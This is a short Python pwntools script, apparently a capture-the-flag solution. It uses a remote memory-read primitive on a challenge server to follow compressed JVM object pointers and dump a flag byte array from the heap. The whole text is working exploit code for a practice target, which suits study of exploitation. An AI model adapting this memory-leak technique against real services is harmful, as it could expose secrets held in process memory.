from pwn import *

context.log_level = "DEBUG"

io = remote("1877b972-6260-475f-97ec-1b3a55146fa9.chall.dev.nnsc.tf", 41337, ssl=True)
# io = remote("localhost", 1337)


def readmem(p):
    io.sendline(hex(p)[2:].encode())
    return int(io.recvline().decode().split(" ")[-1], 16)


def read32(p):
    return (
        (readmem(p + 3) << 24)
        | (readmem(p + 2) << 16)
        | (readmem(p + 1) << 8)
        | readmem(p)
    )


addr = int(io.recvline().decode().split(" ")[-1], 16) << 3
buf_addr = read32(addr + 20) << 3
buf_size = read32(buf_addr + 12)

print("buf addr", hex(buf_addr))
print("buf size", hex(buf_size))
# https://github.com/openjdk/jdk/blob/890adb6410dab4606a4f26a942aed02fb2f55387/src/hotspot/share/oops/arrayOop.hpp#L35-L39
flag = "".join(chr(readmem(buf_addr + 16 + i)) for i in range(buf_size))
print(flag)

